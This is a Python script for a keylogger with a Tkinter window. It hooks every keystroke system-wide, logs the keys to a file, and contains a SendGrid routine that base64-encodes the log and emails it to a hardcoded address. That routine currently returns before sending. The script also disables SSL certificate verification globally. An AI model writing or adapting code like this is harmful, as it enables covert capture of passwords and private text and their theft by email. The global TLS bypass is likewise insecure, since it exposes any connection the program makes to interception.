import tkinter as tk
import base64
import sendgrid
import os
import ssl
import keyboard
from sendgrid.helpers.mail import Mail, Attachment, FileContent, FileName, FileType, Disposition

ssl._create_default_https_context = ssl._create_unverified_context
log_file = "log.txt"

# SendGrid API configuration
SENDGRID_API_KEY = '*'  # Replace with your SendGrid API key
SENDGRID_FROM_EMAIL = 'testingxmyxcases@gmail.com'
SENDGRID_TO_EMAIL = 'testingxmyxcases@gmail.com'
SENDGRID_SUBJECT = "Log File"
SENDGRID_BODY = "Here is the log file with the recorded keystrokes."

keylogger_active = False

def write_to_file(event):
    if event.event_type == 'down':
        key_data = event.name
        print(f"Key pressed: {key_data}")

        # Handle special cases
        if key_data == 'space':
            key_data = ' '
        elif key_data == 'enter':
            key_data = '\n'
        elif key_data == 'backspace':
            key_data = " [BACKSPACE] "
        elif key_data == 'tab':
            key_data = " [TAB] "
        elif key_data == 'delete':
            key_data = " [DELETE] "
        else:
            key_data = f" [{key_data}] "

        # Write to log file
        with open(log_file, "a") as file:
            file.write(key_data)

        # Update the Textbox
        text_box.insert(tk.END, key_data)
        text_box.see(tk.END)

# Function to start keylogger
def start_keylogger():
    global keylogger_active
    if not keylogger_active:
        keylogger_active = True
        with open(log_file, "w") as f:
            f.write("Keylogger started...\n")
        keyboard.hook(write_to_file)
        print("Keylogger started")

# Function to stop keylogger
def stop_keylogger():
    global keylogger_active
    if keylogger_active:
        keylogger_active = False
        keyboard.unhook_all()  # Remove the event handler
        print("Keylogger stopped")

# Function to send email using SendGrid
def send_email_with_sendgrid():
    print('Send email called.')
    return

    sg = sendgrid.SendGridAPIClient(api_key=SENDGRID_API_KEY)
    
    message = Mail(
        from_email=SENDGRID_FROM_EMAIL,
        to_emails=SENDGRID_TO_EMAIL,
        subject=SENDGRID_SUBJECT,
        plain_text_content=SENDGRID_BODY
    )

    # Attach the log file
    if os.path.exists(log_file):
        with open(log_file, 'rb') as f:
            file_data = f.read()
        encoded_file = base64.b64encode(file_data).decode()

        attachment = Attachment(
            FileContent(encoded_file),
            FileName('log.txt'),
            FileType('text/plain'),
            Disposition('attachment')
        )
        message.attachment = attachment

        try:
            response = sg.send(message)
            print(f"Email sent successfully! Status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send email: {e}")
    else:
        print("No log file to attach.")

# Function to create the GUI
def create_gui():
    global text_box  # Make text_box accessible globally

    window = tk.Tk()
    window.title("Keylogger")

    start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
    start_button.pack(pady=10)

    stop_button = tk.Button(window, text="Stop Keylogger", command=lambda: [stop_keylogger()])
    stop_button.pack(pady=10)

    email_button = tk.Button(window, text="Send Email", command=lambda: [send_email_with_sendgrid()])
    email_button.pack(pady=10)

    # Create a Textbox to display pressed keys
    text_box = tk.Text(window, height=15, width=50)
    text_box.pack(pady=10)

    # Run the window
    window.mainloop()

# Run the GUI
create_gui()
